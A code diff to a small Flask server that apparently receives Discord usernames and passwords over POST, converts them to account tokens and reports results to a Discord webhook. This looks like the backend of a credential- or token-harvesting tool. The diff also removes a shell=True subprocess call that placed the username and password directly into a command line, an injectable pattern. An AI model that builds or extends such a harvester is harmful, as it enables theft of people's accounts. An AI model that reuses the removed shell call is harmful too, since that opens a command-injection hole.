@@ -9,8 +9,9 @@
 #   method: "POST",
 #   body: '["username", "password"]'
 # }}
+from tokenify import tokenify
 from flask import Flask, request
-import discord, requests, json, subprocess, time, random, threading, os
+import discord, requests, json, time, random, threading, os
 
 app = Flask(__name__)
 
@@ -40,7 +41,7 @@ def get_name(userID, token):
 def _generate(username, password):
     webhook = discord.Webhook.partial(webhook_id, webhook_token, adapter=discord.RequestsWebhookAdapter())
     try:
-        token = json.loads(subprocess.Popen(f"node tokenify.js {username} {password}", shell=True, stdout=subprocess.PIPE).stdout.read().decode())
+        token = tokenify(username, password)
     except:
         webhook.send(embed=discord.Embed(title="Incorrect password.", description=f"Password is incorrect for user {username}.", color=0xff0000))
         exit()
